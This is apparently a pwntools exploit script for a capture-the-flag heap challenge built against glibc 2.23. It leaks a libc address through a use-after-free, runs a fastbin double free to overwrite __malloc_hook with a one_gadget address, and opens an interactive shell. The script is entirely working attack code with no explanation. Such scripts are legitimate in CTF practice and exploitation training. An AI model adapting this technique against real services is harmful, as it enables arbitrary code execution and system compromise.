#!/usr/bin/python3

from pwn import *

exe = ELF('pwn2_df_patched', checksec=False)
libc = ELF('libc.2.23.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*createHeap+115

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()


def create(idx, size, data):
    sla(b">\n", b"1")
    sla(b"Index:", idx)
    sla(b"size:", size)
    sa(b"data:", data)


def delete(idx):
    sla(b">\n", b"4")
    sla(b":", idx)


def show(idx):
    sla(b">\n", b"2")
    sla(b":", idx)


def edit(idx, data):
    sla(b">\n", b"3")
    sla(b"index:", idx)
    sl(data)


create(b"0", b"130", b"A"*130)
create(b"1", b"130", b"B"*130)

delete(b"0")
show(b"0")
p.recvuntil(b"Data = ")
libc_leak = u64(p.recv(6) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x39bb78
info("libc base: " + hex(libc.address))

create(b"2", b"96", b"a"*96)
create(b"3", b"96", b"a"*96)
delete(b"2")
delete(b"3")
delete(b"2")

create(b"4", b"96", p64(libc.sym['__malloc_hook'] - 35))
create(b"5", b"96", b"C"*0x8)
create(b"6", b"96", b"D"*8)
one_gadget = libc.address + 0xd5bf7
create(b"6", b"96", b"1"* 19 + p64(one_gadget))

delete(b"5")
delete(b"5")

p.interactive()
